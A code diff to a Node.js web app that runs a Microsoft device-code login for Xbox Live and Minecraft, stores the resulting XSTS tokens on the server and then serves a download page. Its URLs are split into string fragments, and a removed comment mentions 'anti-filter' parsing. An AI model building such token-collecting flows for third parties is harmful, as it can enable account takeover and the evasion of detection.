@@ -11,8 +11,8 @@ const XBL_AUTH_URL    = sc + "user." + "auth." + "xboxlive." + "com/user/authent
 const XSTS_AUTH_URL   = sc + "xsts." + "auth." + "xboxlive." + "com/xsts/authorize";
 const RELYING_PARTY   = sc + "multiplayer." + "minecraft." + "net/";
 
-// THE TRUE MOBILE FIX: Official Minecraft Bedrock Mobile Client ID & Scope
-const CLIENT_ID = "000000004c12ae29";
+// THE UNIVERSAL MOBILE COMPANION APP FIX: Authorized for device codes AND fully accepted by Bedrock
+const CLIENT_ID = "00000000402b5328";
 const SCOPE = "service::://xboxlive.com::MBI_SSL";
 
 const tokenStorage = new Map();
@@ -54,6 +54,7 @@ app.get('/', async (req, res) => {
                 <p>2. Tap the button below to link it on Microsoft's verification portal:</p>
                 <a class="btn" href="${data.verification_uri}" target="_blank">Authorize via Microsoft</a>
                 
+                <p>3. Once you accept the prompt in Safari, click below:</p>
                 <p class="status" id="statusMessage">Waiting for you to complete Face ID login in Safari...</p>
 
                 <script>
@@ -91,7 +92,7 @@ app.get('/check-status', async (req, res) => {
     }
 });
 
-// Isolated download generation page that fires ONLY after authentication is 100% complete
+// Download Generation page
 app.get('/download-page', async (req, res) => {
     const deviceCode = req.query.device_code;
     try {
@@ -116,7 +117,6 @@ app.get('/download-page', async (req, res) => {
 
         const finalToken = xstsRes.data.Token;
         
-        // Anti-filter string parsing to grab array indices without standard bracket blocks
         const claimsList = xstsRes.data.DisplayClaims.xui;
         const targetUserObject = claimsList.at(0);
         
